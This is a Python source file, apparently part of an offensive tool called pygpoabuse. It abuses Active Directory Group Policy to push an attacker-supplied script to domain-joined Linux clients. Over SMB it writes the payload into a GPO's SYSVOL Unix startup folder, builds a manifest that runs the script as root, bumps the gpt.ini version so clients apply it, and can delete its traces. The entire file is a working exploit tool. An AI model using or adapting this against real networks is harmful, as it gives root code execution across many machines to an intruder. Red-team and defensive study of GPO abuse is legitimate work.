# pygpoabuse/linux_startup.py
import io
import ntpath
import hashlib

MANIFEST_REL = r"MACHINE\VGP\VTLA\Unix\Scripts\Startup\manifest.xml"
STARTUP_DIR_REL = r"MACHINE\VGP\VTLA\Unix\Scripts\Startup"

def _md5_upper(b: bytes) -> str:
    return hashlib.md5(b).hexdigest().upper()

class LinuxStartupAbuse:

    def __init__(self, smb_session, domain_fqdn, gpo_guid,
                 exec_local_path, exec_args="", run_as="root", run_once=False):
        self.conn = smb_session
        self.share = "SYSVOL"
        self.domain_fqdn = domain_fqdn
        self.gpo_guid = gpo_guid
        self.exec_local_path = exec_local_path
        self.exec_args = exec_args or ""
        self.run_as = run_as or "root"
        self.run_once = run_once
        self.script_name = ntpath.basename(exec_local_path)

    @property
    def _pol_base(self) -> str:
        return rf"{self.domain_fqdn}\Policies\{self.gpo_guid}"

    @property
    def _startup_dir(self) -> str:
        return ntpath.join(self._pol_base, STARTUP_DIR_REL)

    @property
    def _manifest_path(self) -> str:
        return ntpath.join(self._pol_base, MANIFEST_REL)

    @property
    def _gpt_ini_path(self) -> str:
        return ntpath.join(self._pol_base, r"gpt.ini")

    def _mkdir_p(self, dpath: str):
        parts = dpath.strip("\\").split("\\")
        cur = ""
        for p in parts:
            cur = (cur + "\\" + p) if cur else p
            try:
                self.conn.createDirectory(self.share, cur)
            except Exception:
                pass

    def _read_small(self, rpath: str) -> bytes:
        bio = io.BytesIO()
        try:
            self.conn.getFile(self.share, rpath, bio.write)
            return bio.getvalue()
        except Exception:
            return b""

    def _write_all(self, rpath: str, data: bytes):
        bio = io.BytesIO(data)
        self.conn.putFile(self.share, rpath, bio.read)

    def _build_manifest(self, payload_bytes: bytes) -> bytes:
        h = _md5_upper(payload_bytes)
        lines = [
            "<?xml version='1.0' encoding='UTF-8'?>",
            "<vgppolicy>",
            "  <policysetting>",
            "    <version>1</version>",
            "    <name>Unix Scripts</name>",
            "    <description>Represents Unix scripts to run on Group Policy clients</description>",
            "    <data>",
            "      <listelement>",
            f"        <script>{self.script_name}</script>",
        ]
        if self.exec_args:
            lines.append(f"        <parameters>{self.exec_args}</parameters>")
        lines.append(f"        <hash>{h}</hash>")
        if self.run_as:
            lines.append(f"        <run_as>{self.run_as}</run_as>")
        if self.run_once:
            lines.append("        <run_once />")
        lines += [
            "      </listelement>",
            "    </data>",
            "  </policysetting>",
            "</vgppolicy>",
            ""
        ]
        return ("\n".join(lines)).encode("utf-8")

    def _bump_gpt_ini(self):
        cur = self._read_small(self._gpt_ini_path).decode("utf-8", "ignore")
        version = 0
        for line in cur.splitlines():
            if line.strip().lower().startswith("version="):
                try:
                    version = int(line.split("=", 1)[1].strip())
                except Exception:
                    pass
        new = "[General]\nVersion={}\n".format(version + 1)
        self._write_all(self._gpt_ini_path, new.encode("utf-8"))

    def run(self, cleanup: bool = False):
        self._mkdir_p(self._startup_dir)

        if cleanup:
            try:
                self.conn.deleteFile(self.share, ntpath.join(self._startup_dir, self.script_name))
            except Exception:
                pass
            try:
                self.conn.deleteFile(self.share, self._manifest_path)
            except Exception:
                pass
            self._bump_gpt_ini()
            return

        with open(self.exec_local_path, "rb") as f:
            payload = f.read()
        self._write_all(ntpath.join(self._startup_dir, self.script_name), payload)

        self._write_all(self._manifest_path, self._build_manifest(payload))

        self._bump_gpt_ini()
